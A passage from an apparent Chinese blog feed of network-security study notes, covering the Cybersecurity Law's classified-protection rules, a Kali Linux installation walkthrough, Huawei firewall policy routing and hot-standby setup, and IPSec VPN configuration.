title="等级保护制度"></a>等级保护制度</h3><p><strong>第二十一条国家实行网络安全等级保护制度。网络运营者应当按照网络安全等级保护制度的要求，履行下列安全保护义务，保障网络免受干扰、破坏或者未经授权的访问，防止网络数据泄露或者被窃取、篡改：</strong></p><ul><li>(一)制定内部安全管理制度和操作规程，确定网络安全负责人，落实网络安全保护责任</li><li>(二)采取防范计算机病毒和网络攻击、网络侵入等危害网络安全行为的技术措施</li><li>(三)采取监测、记录网络运行状态、网络安全事件的技术措施，并按照规定留存相关的网络日志不少于六个月</li><li>(四)采取数据分类、重要数据备份和加密等措施;</li><li>(五)法律、行政法规规定的其他义务。</li></ul><h3 id="网络实名制"><a href="#网络实名制" class="headerlink" title="网络实名制"></a>网络实名制</h3><p><strong>第二十四条网络运营者为用户办理网络接入、域名注册服务，办理固定电话、移动电话等入网手续，或者为用户提供信息发布、即时通讯等服务在与用户签订协议或者确认提供服务时，应当要求用户提供真实身份信息用户不提供真实身份信息的，网络运营者不得为其提供相关服务</strong></p><p><strong>已有法律法规对实名制的规定</strong></p><ul><li>2016年1月1日实施的《中华人民共和国反恐怖主义法》</li><li>2015年实施的《互联网用户账户名称管理规定》</li><li>2016年实施的《移动互联网应用程序信息服务管理规定》</li></ul><h3 id="关基保护"><a href="#关基保护" class="headerlink" title="关基保护"></a>关基保护</h3><p><strong>第三十一条 国家对公共通信和信息服务、能源、交通、水利、金融、公共服务、电子政务等重要行业和领域，以及其他一旦遭到破坏、丧失功能或者数据泄露，可能严重危害国家安全、国计民生、公共利益的关键信息基础设施，在网络安全等级保护制度的基础上，实行重点保护。关键信息基础设施的具体范围和安全保护办法由国务院制定</strong></p><ul><li>《关键信息基础设施安全保护条例》自2021年9月1日起施行</li><li>不低于等级保护三级</li></ul><h2 id="等级保护"><a href="#等级保护" class="headerlink" title="等级保护"></a>等级保护</h2><h3 id="等级保护发展历程"><a href="#等级保护发展历程" class="headerlink" title="等级保护发展历程"></a>等级保护发展历程</h3><p><img src="/../img/img_artical/net_sec/9.1.4.png" alt="9.1.4"></p><h3 id="等级保护2-0"><a href="#等级保护2-0" class="headerlink" title="等级保护2.0"></a>等级保护2.0</h3><ul><li>《网络安全法》第二十一条国家实行网络安全等级保护制度</li><li>2019年12月，网络安全等级保护2.0国家标准正式实施</li></ul><p><img src="/../img/img_artical/net_sec/9.1.5.png" alt="9.1.5"></p><h3 id="实施基本流程"><a href="#实施基本流程" class="headerlink" title="实施基本流程"></a>实施基本流程</h3><p><strong>等级保护五个阶段</strong></p><p><img src="/../img/img_artical/net_sec/9.1.6.png" alt="9.1.6"></p><h3 id="等保机构"><a href="#等保机构" class="headerlink" title="等保机构"></a>等保机构</h3><p><img src="/../img/img_artical/net_sec/9.1.7.png" alt="9.1.7"></p><h3 id="等保对象"><a href="#等保对象" class="headerlink" title="等保对象"></a>等保对象</h3><p><img src="/../img/img_artical/net_sec/9.1.8.png" alt="9.1.8"></p><h3 id="等保级别"><a href="#等保级别" class="headerlink" title="等保级别"></a>等保级别</h3><p><img src="/../img/img_artical/net_sec/9.1.9.png" alt="9.1.9"></p><h3 id="等保基本要求"><a href="#等保基本要求" class="headerlink" title="等保基本要求"></a>等保基本要求</h3><p><img src="/../img/img_artical/net_sec/9.1.10.png" alt="9.1.10"></p><p><strong>一个中心三重防御</strong></p><ul><li>一个中心指安全管理中心</li><li>三重防御指安全计算环境、安全区域边界、安全网络通信</li></ul><h3 id="安全域设计示范"><a href="#安全域设计示范" class="headerlink" title="安全域设计示范"></a>安全域设计示范</h3><p><img src="/../img/img_artical/net_sec/9.1.11.png" alt="9.1.11"></p><h3 id="安全通信网络设计"><a href="#安全通信网络设计" class="headerlink" title="安全通信网络设计"></a>安全通信网络设计</h3><p><img src="/../img/img_artical/net_sec/9.1.12.png" alt="9.1.12"></p><h3 id="安全区域边界设计"><a href="#安全区域边界设计" class="headerlink" title="安全区域边界设计"></a>安全区域边界设计</h3><p><img src="/../img/img_artical/net_sec/9.1.13.png" alt="9.1.13"></p><h3 id="安全计算环境设计"><a href="#安全计算环境设计" class="headerlink" title="安全计算环境设计"></a>安全计算环境设计</h3><p><img src="/../img/img_artical/net_sec/9.1.14.png" alt="9.1.14"></p><h3 id="安全管理中心设计"><a href="#安全管理中心设计" class="headerlink" title="安全管理中心设计"></a>安全管理中心设计</h3><p><img src="/../img/img_artical/net_sec/9.1.15.png" alt="9.1.15"></p><h3 id="安全物理环境设计"><a href="#安全物理环境设计" class="headerlink" title="安全物理环境设计"></a>安全物理环境设计</h3><p><img src="/../img/img_artical/net_sec/9.1.16.png" alt="9.1.16"></p><h3 id="安全管理规划"><a href="#安全管理规划" class="headerlink" title="安全管理规划"></a>安全管理规划</h3><p><img src="/../img/img_artical/net_sec/9.1.17.png" alt="9.1.17"></p><h2 id="安装Kali攻防平台"><a href="#安装Kali攻防平台" class="headerlink" title="安装Kali攻防平台"></a>安装Kali攻防平台</h2><h3 id="kali是什么"><a href="#kali是什么" class="headerlink" title="kali是什么"></a>kali是什么</h3><p><strong>一款基于Debian Linux的操作系统</strong></p><ul><li>集成大量”渗透测试”工具，如nmap&#x2F;Hydra&#x2F;MetasploitFramework等</li><li>可访问官网 <a href="https://www.kali.org/">https://www.kali.org</a></li><li>下载安装镜像 kali-linux-2022.3-installer-amd64.iso</li></ul><h3 id="2、准备一台虚拟机"><a href="#2、准备一台虚拟机" class="headerlink" title="2、准备一台虚拟机"></a>2、准备一台虚拟机</h3><p><strong>内存2G、磁盘20G、网络NAT模式</strong></p><p><strong>连接 kali-linux-2022.3-installer-amd64.iso镜像文件</strong></p><p><img src="/../img/img_artical/net_sec/9.1.18.png" alt="9.1.18"></p><h3 id="安装kali2022系统"><a href="#安装kali2022系统" class="headerlink" title="安装kali2022系统"></a>安装kali2022系统</h3><p><strong>选择Graphicalinstall图形化安装、中文语言</strong></p><p><img src="/../img/img_artical/net_sec/9.1.19.png" alt="9.1.19"></p><p><strong>配置主机名kali、用户名kali、密码kali</strong></p><p><img src="/../img/img_artical/net_sec/9.1.20.png" alt="9.1.20"></p><p><strong>使用磁盘，将所有文件放在同一个分区中</strong></p><p><img src="/../img/img_artical/net_sec/9.1.21.png" alt="9.1.21"></p><p><strong>将GRUB启动器安装在磁盘&#x2F;dev&#x2F;sda中，最后结束安装</strong></p><p><img src="/../img/img_artical/net_sec/9.1.22.png" alt="9.1.22"></p><h2 id="kali环境基本操作"><a href="#kali环境基本操作" class="headerlink" title="kali环境基本操作"></a>kali环境基本操作</h2><h3 id="1、登入桌面环境"><a href="#1、登入桌面环境" class="headerlink" title="1、登入桌面环境"></a>1、登入桌面环境</h3><p><strong>以用户（kali&#x2F;kali）登入</strong></p><p><img src="/../img/img_artical/net_sec/9.1.23.png" alt="9.1.23"></p><h3 id="禁止自动锁屏和休眠"><a href="#禁止自动锁屏和休眠" class="headerlink" title="禁止自动锁屏和休眠"></a>禁止自动锁屏和休眠</h3><p><strong>左上”龙标” &#x3D;&gt;  设置  &#x3D;&gt;  电源管理器</strong></p><ul><li>将空白、休眠、关闭都设为从不</li></ul><p><img src="/../img/img_artical/net_sec/9.1.24.png" alt="9.1.24"></p><h3 id="使用网页浏览器"><a href="#使用网页浏览器" class="headerlink" title="使用网页浏览器"></a>使用网页浏览器</h3><p><strong>左上”龙标”  &#x3D;&gt;  收藏夹  &#x3D;&gt;  网络浏览器</strong></p><ul><li>可右击  &#x3D;&gt;  添加到桌面，方便日常使用</li></ul><h3 id="4、访问文档资料"><a href="#4、访问文档资料" class="headerlink" title="4、访问文档资料"></a>4、访问文档资料</h3><p><strong>左上”打开文件夹”</strong></p><ul><li>可访问各种目录、文件资源</li></ul><p><img src="/../img/img_artical/net_sec/9.1.25.png" alt="9.1.25"></p><h3 id="使用命令行窗口"><a href="#使用命令行窗口" class="headerlink" title="使用命令行窗口"></a>使用命令行窗口</h3><p><strong>单击左上”终端模拟器”</strong></p><ul><li>可以运行kali支持的各种控制指令，比如reboot 可重启</li><li>注意：~ 代表用户的主目录；最后的$表示当前具有普通用户权限</li></ul><p><img src="/../img/img_artical/net_sec/9.1.26.png" alt="9.1.26"></p><p><strong>执行sudo -i可提权为管理员</strong></p><ul><li>需验证当前用户的密码</li><li>成功以后，命令行前的权限表示$会变为#</li></ul><p><img src="/../img/img_artical/net_sec/9.1.27.png" alt="9.1.27"></p><p><strong>执行 passwd root 可以为管理员设置密码</strong></p><ul><li>根据提示输入2次新密码，比如ntd.cn1234</li></ul><p><img src="/../img/img_artical/net_sec/9.1.28.png" alt="9.1.28"></p><h3 id="6、配置国内软件源"><a href="#6、配置国内软件源" class="headerlink" title="6、配置国内软件源"></a>6、配置国内软件源</h3><ul><li>注销当前桌面，改用root用户登录</li><li>打开文件夹，找到配置文件 &#x2F;etc&#x2F;apt&#x2F;sources.list，双击打开<ul><li>删除原有文本，增加国内软件源</li><li>deb <a href="https://mirrors.aliyun.com/kali">https://mirrors.aliyun.com/kali</a> kali-rolling main non-free contrib</li><li>deb-src <a href="https://mirrors.aliyun.com/kali">https://mirrors.aliyun.com/kali</a> kali-rolling main non-free contrib</li><li>deb <a href="https://repo.huaweicloud.com/kali">https://repo.huaweicloud.com/kali</a> kali-rolling main non-free contrib</li><li>deb-src <a href="https://repo.huaweicloud.com/kali">https://repo.huaweicloud.com/kali</a> kali-rolling main non-free contrib</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全（更新ing） </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全-网络安全解决方案3</title>
      <link href="/posts/secsol3.html"/>
      <url>/posts/secsol3.html</url>
      
        <content type="html"><![CDATA[<h1 id="网络安全解决方案"><a href="#网络安全解决方案" class="headerlink" title="网络安全解决方案"></a>网络安全解决方案</h1><h2 id="防火墙策略路由"><a href="#防火墙策略路由" class="headerlink" title="防火墙策略路由"></a>防火墙策略路由</h2><h3 id="策略路由定义"><a href="#策略路由定义" class="headerlink" title="策略路由定义"></a>策略路由定义</h3><p><strong>策略路由定义和目的</strong></p><ul><li>FW转发数据时，会查找路由表，并根据目的地址来进行转发</li><li>在这种机制下，只能根据报文的目的地址为用户提供转发服务，无法提供有差别的服务</li><li>策略路由是在路由表已经产生的情况下，不按照现有路由表进行转发，而是根据用户制定的策略进行路由选择的机制，从更多的维度 （入接口、源安全区域、源&#x2F;目的IP地址用户、服务、应用）来决定报文如何转发，增加了在报文转发控制上的灵活度。策略路由并没有替代路由表机制，而是优先于路由表生效，为某些特殊业务指定转发方向</li></ul><h3 id="策略路由应用场景"><a href="#策略路由应用场景" class="headerlink" title="策略路由应用场景"></a>策略路由应用场景</h3><p><strong>策略路由应用于多出口组网中</strong></p><ul><li>FW作为出口网关，存在两个网络出口</li><li>通过策略路由，可以根据需要进行选择网络出口</li></ul><h3 id="策略路由组成"><a href="#策略路由组成" class="headerlink" title="策略路由组成"></a>策略路由组成</h3><p><strong>策略路由组成：匹配条件、动作</strong></p><p><strong>匹配条件</strong></p><ul><li>入接口&#x2F;源安全区域</li><li>IP地址&#x2F;MAC地址（源、目的）</li><li>用户、服务、应用、时间段</li><li>DSCP优先级：进行流量类型识别</li></ul><p><strong>实施策略路由动作</strong></p><ul><li>转发：单出口（下一跳）、多出口(智能选路)</li><li>不做策略路由：按照现有路由表进行转发</li></ul><h3 id="策略路由匹配过程"><a href="#策略路由匹配过程" class="headerlink" title="策略路由匹配过程"></a>策略路由匹配过程</h3><p><strong>FW会按照匹配顺序</strong></p><ul><li>首先寻找第一条规则，如果满足条件执行动作</li><li>如果不满足第一条规则的匹配条件</li><li>寻找下一条策略路由规则</li><li>如果所有策略的匹配条件都无法满足</li><li>则按照路由表进行转发</li></ul><p><img src="/../img/img_artical/net_sec/8.3.1.png" alt="8.3.1"></p><h2 id="基于源地址的策略路由"><a href="#基于源地址的策略路由" class="headerlink" title="基于源地址的策略路由"></a>基于源地址的策略路由</h2><h3 id="企业需求"><a href="#企业需求" class="headerlink" title="企业需求"></a>企业需求</h3><ul><li>企业出口防火墙部署两条公网链路，ISP1-电信和ISP2-联通</li><li>企业要求:192.168.10.0网段的流量由g1&#x2F;0&#x2F;2发出，走ISP1-电信</li><li>企业要求:192.168.30.0网段的流量由g1&#x2F;0&#x2F;3发出，走ISP2-联通</li></ul><p><img src="/../img/img_artical/net_sec/8.3.2.png" alt="8.3.2"></p><h3 id="配置步骤"><a href="#配置步骤" class="headerlink" title="配置步骤"></a>配置步骤</h3><ul><li>第一步:配置接口地址，配置地址对象</li><li>第二步:配置安全策略</li><li>第三步:配置IP-link探测</li><li>第四步:配置策略路由</li><li>第五步:配置NAT策略</li><li>第六步:验证</li></ul><h3 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h3><p><strong>配置”安全区域”和”IP地址”</strong></p><p><img src="/../img/img_artical/net_sec/8.3.3.png" alt="8.3.3"></p><p><strong>为便于引用，配置地址对象”财务10网段”和”研发30网段”</strong></p><p><img src="/../img/img_artical/net_sec/8.3.4.png" alt="8.3.4"></p><h3 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h3><p><strong>配置安全策略，允许财务和研发访问外网</strong></p><p><img src="/../img/img_artical/net_sec/8.3.5.png" alt="8.3.5"></p><h3 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h3><p><strong>为使双出口冗余，配置链路状态探测</strong></p><p><img src="/../img/img_artical/net_sec/8.3.6.png" alt="8.3.6"></p><h3 id="第四步"><a href="#第四步" class="headerlink" title="第四步"></a>第四步</h3><ul><li>配置”财务”流量走”电信”网，”研发”流量走”联通”</li><li>配置监控链路”可靠性检测”，以实现”链路冗余”</li></ul><p><img src="/../img/img_artical/net_sec/8.3.7.png" alt="8.3.7"></p><h3 id="第五步"><a href="#第五步" class="headerlink" title="第五步"></a>第五步</h3><p>便于”内网”私有地址访问”公网”</p><p><img src="/../img/img_artical/net_sec/8.3.8.png" alt="8.3.8"></p><h3 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h3><ul><li>验证1：双路出口正常，财务流量走电信，研发流量走联通</li><li>验证2：电信网络断开，财务和研发流量都走联通</li></ul><p><img src="/../img/img_artical/net_sec/8.3.9.png" alt="8.3.9"></p><h2 id="防火墙部署双机热备"><a href="#防火墙部署双机热备" class="headerlink" title="防火墙部署双机热备"></a>防火墙部署双机热备</h2><h3 id="双机热备"><a href="#双机热备" class="headerlink" title="双机热备"></a>双机热备</h3><p><strong>华为防火墙的双机热备包含以下两种模式：</strong></p><ul><li><p>热备模式：同一时间只用一台防火墙转发数据包，其他防火墙不转发数据包，但是会同步会话表及Server-map表</p></li><li><p>负载均衡模式：同一时间，多台防火墙同时转发数据，但每个防火墙又作为其他防火墙的备用设备，即每个防火墙即是主用设备也是备用设备，防火墙之间同步会话表及Server-map表</p></li></ul><p><strong>要求如下：</strong></p><ul><li>两台防火墙用于心跳线的接口加入相同的安全区域</li><li>两台防火墙用于心跳线的接口的设备编号一致</li><li>建议用于双机热备的两台防火墙采用相同的型号、相同的VRP版本</li></ul><h3 id="企业需求-1"><a href="#企业需求-1" class="headerlink" title="企业需求"></a>企业需求</h3><p><strong>企业需求</strong></p><ul><li>公司出口有两台边界防火墙分别连接电信和联通</li><li>负载分担：财务部流量走电信，研发部流量走联通</li><li>相互几余：某一出口不通，流量能够自动切换，避免网络中断，实现网络的稳定性和可靠性.</li><li>方案：FW1和FW2部署双机热备</li></ul><p><img src="/../img/img_artical/net_sec/8.3.10.png" alt="8.3.10"></p><h3 id="配置步骤-1"><a href="#配置步骤-1" class="headerlink" title="配置步骤"></a>配置步骤</h3><p><strong>第一步：配置接口地址</strong></p><p><strong>第二步：配置安全策略</strong></p><p><strong>第三步：配置NAT策略</strong></p><p><strong>第四步：配置默认路由</strong></p><p><strong>第五步：配置IP-Link</strong></p><p><strong>第六步：配置双机热备</strong></p><ul><li>配置运行模式</li><li>心跳接口</li><li>接口监控</li><li>虚拟IP地址</li><li>IP-Link监控</li></ul><h3 id="第一步-1"><a href="#第一步-1" class="headerlink" title="第一步"></a>第一步</h3><p><strong>注意：配置G1&#x2F;0&#x2F;0为防火墙之间的心跳线，用于协商主备状态</strong></p><p><img src="/../img/img_artical/net_sec/8.3.11.png" alt="8.3.11"></p><h3 id="第二步-1"><a href="#第二步-1" class="headerlink" title="第二步"></a>第二步</h3><p><strong>配置安全策略，使内网可以访问外网</strong></p><p><img src="/../img/img_artical/net_sec/8.3.12.png" alt="8.3.12"></p><h3 id="第三步-1"><a href="#第三步-1" class="headerlink" title="第三步"></a>第三步</h3><p><strong>配置NAT策略，使内网私有地址访问外网</strong></p><p><img src="/../img/img_artical/net_sec/8.3.13.png" alt="8.3.13"></p><h3 id="第四步-1"><a href="#第四步-1" class="headerlink" title="第四步"></a>第四步</h3><p><strong>配置默认路由</strong></p><p><img src="/../img/img_artical/net_sec/8.3.14.png" alt="8.3.14"></p><h3 id="第五步-1"><a href="#第五步-1" class="headerlink" title="第五步"></a>第五步</h3><p><strong>为使双出口冗余，配置链路状态探测</strong></p><p><img src="/../img/img_artical/net_sec/8.3.15.png" alt="8.3.15"></p><h3 id="第六步"><a href="#第六步" class="headerlink" title="第六步"></a>第六步</h3><p><strong>配置双机热备</strong></p><ul><li>运行模式：负载分担</li><li>心跳接口：G1&#x2F;0&#x2F;0</li><li>主动抢占：启用</li><li>虚拟IP：<ul><li>主：192.168.10.253</li><li>备：192.168.10.254</li></ul></li><li>IP-Link：探测电信</li></ul><p><img src="/../img/img_artical/net_sec/8.3.16.png" alt="8.3.16"></p><h3 id="验证-1"><a href="#验证-1" class="headerlink" title="验证"></a>验证</h3><ul><li>验证1：不同部门电脑访问千度，财务走电信网，研发走联通网</li><li>验证2：断开电信链路，财务部电脑流量切换至联通网络</li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全（更新ing） </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全解决方案 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全-网络安全解决方案2</title>
      <link href="/posts/secsol2.html"/>
      <url>/posts/secsol2.html</url>
      
        <content type="html"><![CDATA[<h1 id="网络安全解决方案"><a href="#网络安全解决方案" class="headerlink" title="网络安全解决方案"></a>网络安全解决方案</h1><h2 id="VPN概述"><a href="#VPN概述" class="headerlink" title="VPN概述"></a>VPN概述</h2><h3 id="为什么需要VPN"><a href="#为什么需要VPN" class="headerlink" title="为什么需要VPN"></a>为什么需要VPN</h3><p><strong>互联网存在各种安全隐患</strong></p><ul><li>机密性:网上传输的数据有被窃听的风险</li><li>完整性:网上传输的数据有被篡改的危险</li><li>不可抵赖性:通信双方有被冒充的风险</li></ul><h3 id="VPN是什么"><a href="#VPN是什么" class="headerlink" title="VPN是什么"></a>VPN是什么</h3><p><strong>VPN是什么</strong></p><ul><li>Virtual Private Network: 虚拟专用网</li><li>VPN可以在不改变网络架构的情况下，建立虚拟专用连接，可以提高数据传输的安全性和稳定性</li><li>用于分公司和总部之间网络互联</li><li>用于员工接入到公司内部网络</li></ul><p><strong>VPN两个特性</strong></p><ul><li>虚拟</li><li>专用</li></ul><h3 id="VPN的特性"><a href="#VPN的特性" class="headerlink" title="VPN的特性"></a>VPN的特性</h3><p><strong>VPN建立“保护”网络实体之间的通信</strong></p><ul><li>使用加密技术防止数据被窃听</li><li>数据完整性验证，防止数据被破坏、篡改</li><li>通过认证机制确认身份，防止冒充</li></ul><h3 id="VPN的优势"><a href="#VPN的优势" class="headerlink" title="VPN的优势"></a>VPN的优势</h3><p><strong>VPN的优势</strong></p><ul><li>安全：采用加密及身份验证等安全技术，保障传输数据的安全和保密性</li><li>廉价：利用公共网络，建立虚拟隧道进行数据通信</li><li>连接灵活方便:任何时间，任何地点，安全高效的访问资源</li><li>可扩展性强：物理网络架构增加或改变，不影响VPN的部署</li></ul><h3 id="VPN的分类"><a href="#VPN的分类" class="headerlink" title="VPN的分类"></a>VPN的分类</h3><p><strong>常见VPN的分类</strong></p><ul><li>IPSec VPN：站点到站点</li><li>L2TP VPN：员工远程访问</li><li>SSL VPN：员工远程访问</li><li>BGP&#x2F;MPLS VPN：运营商专线网络</li></ul><h3 id="IPSec是什么"><a href="#IPSec是什么" class="headerlink" title="IPSec是什么"></a>IPSec是什么</h3><p><strong>IPSec（Internet Protocol Security）互联网安全协议，通过对IP协议的分组进行加密和认证来保护IP协议的网络传输的协议簇</strong></p><ul><li>认证头（AH）提供无连接数据完整性、消息认证以及防重放攻击保护</li><li>封装安全载荷（ESP）提供机密性、数据源认证、无连接完整性等</li><li>安全关联（SA）提供算法和数据包，提供AH、ESP操作所需的参数</li><li>密钥协议（IKE）提供对称密码的钥匙的生存和交换</li></ul><h2 id="IPSec-VPN-点到点-北京总部防火墙配置"><a href="#IPSec-VPN-点到点-北京总部防火墙配置" class="headerlink" title="IPSec VPN 点到点-北京总部防火墙配置"></a>IPSec VPN 点到点-北京总部防火墙配置</h2><h3 id="实验拓扑"><a href="#实验拓扑" class="headerlink" title="实验拓扑"></a>实验拓扑</h3><p><img src="/../img/img_artical/net_sec/8.2.1.png" alt="8.2.1"></p><h3 id="企业需求分析"><a href="#企业需求分析" class="headerlink" title="企业需求分析"></a>企业需求分析</h3><ul><li>背景:企业在北京建立集团总部，在上海设立分公司，集团总部和分公司的财务数据互访，需要安全可靠的传输</li><li>方案:在总部和分公司的出口部署边界防火墙，采用IPSecVPN技术</li><li>优势:不改变企业网络架构，实现集团和分公司的数据高效安全的传输</li></ul><h3 id="配置思路"><a href="#配置思路" class="headerlink" title="配置思路"></a>配置思路</h3><p><strong>首先配置北京总部防火墙</strong></p><ul><li>第一步：配置接口地址</li><li>第二步：配置对象</li><li>第三步：配置安全策略</li><li>第四步：配置路由</li><li>第五步：配置IPSecVPN<ul><li>定义名称</li><li>定义对端地址</li><li>定义预共享秘钥</li><li>定义待加密的数据流</li><li>定义安全提议</li></ul></li><li>第六步：配置公网路由器</li></ul><h3 id="第一步"><a href="#第一步" class="headerlink" title="第一步"></a>第一步</h3><ul><li>配置外网接口GE1&#x2F;0&#x2F;0安全区域untrust，IP地址100.1.1.1&#x2F;24</li><li>配置内网接口GE1&#x2F;0&#x2F;1安全区域trust，IP地址192.168.10.254&#x2F;24</li></ul><p><img src="/../img/img_artical/net_sec/8.2.2.png" alt="8.2.2"></p><h3 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h3><p><strong>为方便后期配置时调用，配置地址对象BJ、FW-BJ、FW-SH、SH</strong></p><p><img src="/../img/img_artical/net_sec/8.2.3.png" alt="8.2.3"></p><h3 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h3><p><strong>配置安全策略使内网之间、防火墙之间可以互访</strong></p><p><img src="/../img/img_artical/net_sec/8.2.4.png" alt="8.2.4"></p><h3 id="第四步"><a href="#第四步" class="headerlink" title="第四步"></a>第四步</h3><p><strong>配置默认路由即可</strong></p><p><img src="/../img/img_artical/net_sec/8.2.5.png" alt="8.2.5"></p><h3 id="第五步"><a href="#第五步" class="headerlink" title="第五步"></a>第五步</h3><p><strong>配置本端地址、对端地址、认证方式、待加密数据流</strong></p><p><img src="/../img/img_artical/net_sec/8.2.6.png" alt="8.2.6"></p><h3 id="第六步"><a href="#第六步" class="headerlink" title="第六步"></a>第六步</h3><p><strong>此网络比较简单，配置IP地址即可</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[R1]interface GigabitEthernet0/0/0</span><br><span class="line">[R1-G0/0/0]ip address 100.1.1.2 24</span><br><span class="line">[R1-G0/0/0]interface GigabitEthernet0/0/1</span><br><span class="line">[R1-G0/0/1]ip address 200.1.1.2 24</span><br></pre></td></tr></table></figure><h2 id="IPSec-VPN-点到点-上海分公司防火墙配置"><a href="#IPSec-VPN-点到点-上海分公司防火墙配置" class="headerlink" title="IPSec VPN 点到点-上海分公司防火墙配置"></a>IPSec VPN 点到点-上海分公司防火墙配置</h2><h3 id="第一步-1"><a href="#第一步-1" class="headerlink" title="第一步"></a>第一步</h3><ul><li>配置外网接口GE1&#x2F;0&#x2F;0安全区域untrust，IP地址100.1.1.1&#x2F;24</li><li>配置内网接口GE1&#x2F;0&#x2F;1安全区域trust，IP地址172.16.10.254&#x2F;24</li></ul><p><img src="/../img/img_artical/net_sec/8.2.7.png" alt="8.2.7"></p><h3 id="第二步-1"><a href="#第二步-1" class="headerlink" title="第二步"></a>第二步</h3><p><strong>为方便后期配置时调用，配置地址对象BJ、FW-BJ、FW-SH、SH</strong></p><p><img src="/../img/img_artical/net_sec/8.2.8.png" alt="8.2.8"></p><h3 id="第三步-1"><a href="#第三步-1" class="headerlink" title="第三步"></a>第三步</h3><p><strong>配置安全策略使内网之间、防火墙之间可以互访</strong></p><p><img src="/../img/img_artical/net_sec/8.2.9.png" alt="8.2.9"></p><h3 id="第四步-1"><a href="#第四步-1" class="headerlink" title="第四步"></a>第四步</h3><p><strong>配置默认路由即可</strong></p><p><img src="/../img/img_artical/net_sec/8.2.10.png" alt="8.2.10"></p><h3 id="第五步-1"><a href="#第五步-1" class="headerlink" title="第五步"></a>第五步</h3><p><strong>配置本端地址、对端地址、认证方式、待加密数据流</strong></p><p><img src="/../img/img_artical/net_sec/8.2.11.png" alt="8.2.11"></p><h3 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h3><ul><li>验证：总部Client1访问分公司Client2</li><li>验证：分公司Client2访问总部Client1</li></ul><p><img src="/../img/img_artical/net_sec/8.2.12.png" alt="8.2.12"></p><p><img src="/../img/img_artical/net_sec/8.2.13.png" alt="8.2.13"></p><h2 id="安全提议"><a href="#安全提议" class="headerlink" title="安全提议"></a>安全提议</h2><h3 id="安全提议-1"><a href="#安全提议-1" class="headerlink" title="安全提议"></a>安全提议</h3><p><strong>阶段一</strong></p><ul><li>配置IKE安全提议（算法集合）</li></ul><p><strong>作用</strong></p><ul><li>认证身份、为IPSec自动分发密钥、建立IPSec SA</li><li>简化IPSec的使用、管理、配置和维护</li></ul><p><img src="/../img/img_artical/net_sec/8.2.14.png" alt="8.2.14"></p><p><strong>阶段二</strong></p><ul><li>配置IPSec安全提议（算法集合）</li></ul><p><strong>作用</strong></p><ul><li>对传输的用户业务数据进行保护处理，降低信息泄漏的风险</li><li>数据来源验证、数据加密、数据完整性、抗重放</li></ul><h3 id="加密算法"><a href="#加密算法" class="headerlink" title="加密算法"></a>加密算法</h3><p><strong>加密算法：保证数据机密性</strong></p><ul><li>DES:数据加密标准-56位的密钥</li><li>3DES:三重数据加密算法-共168位密钥</li><li>AES:高级加密标准-分为128位、192位、256位秘钥</li><li>SM1和SM4:国密算法-128位</li></ul><p><img src="/../img/img_artical/net_sec/8.2.15.png" alt="8.2.15"></p><h3 id="认证算法"><a href="#认证算法" class="headerlink" title="认证算法"></a>认证算法</h3><p><strong>哈希（HASH），散列算法、消息摘要算法，保证数据完整性</strong></p><ul><li><p>MD5：信息-摘要算法-128位密钥</p></li><li><p>SHA1：安全散列算法-160位密钥</p></li><li><p>SHA2-256、SHA2-384、SHA2-512</p></li><li><p>SM3：国产哈希算法</p></li></ul><p><img src="/../img/img_artical/net_sec/8.2.16.png" alt="8.2.16"></p><h3 id="DH算法"><a href="#DH算法" class="headerlink" title="DH算法"></a>DH算法</h3><p><strong>DH：迪菲 - 赫尔曼</strong></p><ul><li>一般被用来实现IPSec中的Internet密钥交换</li><li>DH算法将对称加密算法和非对称加密算法综合在一起</li></ul><p><strong>DH算法支持可变的密钥长度</strong></p><ul><li>其中DH组1为768，DH组2为1024，DH组5为1536，DH组14为2048</li><li>密钥的有效长度越长，安全性也就越强，同时CPU的资源占用率也就越高</li></ul><h3 id="IPSec-VPN连接步骤"><a href="#IPSec-VPN连接步骤" class="headerlink" title="IPSec VPN连接步骤"></a>IPSec VPN连接步骤</h3><p><strong>建立IPSec VPN分为2个阶段</strong></p><ul><li>建立管理连接（阶段一）使用的算法</li><li>建立数据连接（阶段二）使用的算法</li></ul><h2 id="IPSec-VPN-点到多点"><a href="#IPSec-VPN-点到多点" class="headerlink" title="IPSec VPN 点到多点"></a>IPSec VPN 点到多点</h2><h3 id="实验拓扑-1"><a href="#实验拓扑-1" class="headerlink" title="实验拓扑"></a>实验拓扑</h3><p><img src="/../img/img_artical/net_sec/8.2.17.png" alt="8.2.17"></p><h3 id="企业需求分析-1"><a href="#企业需求分析-1" class="headerlink" title="企业需求分析"></a>企业需求分析</h3><ul><li>企业规模发展，在多个城市设立分公司</li><li>企业要求，集团总部和所有分公司的财务数据要实时同步，实现高效且安全的传输，分公司之间不需要同步数据</li><li>集团对应多个分公司，部署点到多点的IPSeC VPN来满足需求</li><li>部署IPSec VPN的优势是不改变企业网络架构，实现集团和分公司的数据高效且安全的传输</li></ul><h3 id="配置思路-1"><a href="#配置思路-1" class="headerlink" title="配置思路"></a>配置思路</h3><ul><li>第一步：配置接口地址</li><li>第二步：配置对象</li><li>第三步：配置安全策略</li><li>第四步：配置路由</li><li>第五步：配置IPSec VPN</li></ul><h3 id="配置北京总部防火墙"><a href="#配置北京总部防火墙" class="headerlink" title="配置北京总部防火墙"></a>配置北京总部防火墙</h3><p><strong>第一步：配置FW-BJ的接口地址</strong></p><p><img src="/../img/img_artical/net_sec/8.2.18.png" alt="8.2.18"></p><p><strong>第二步：配置地址和地址组对象</strong></p><ul><li>增加重庆分公司内网CQ和防火墙出口FW-CQ</li></ul><p><img src="/../img/img_artical/net_sec/8.2.19.png" 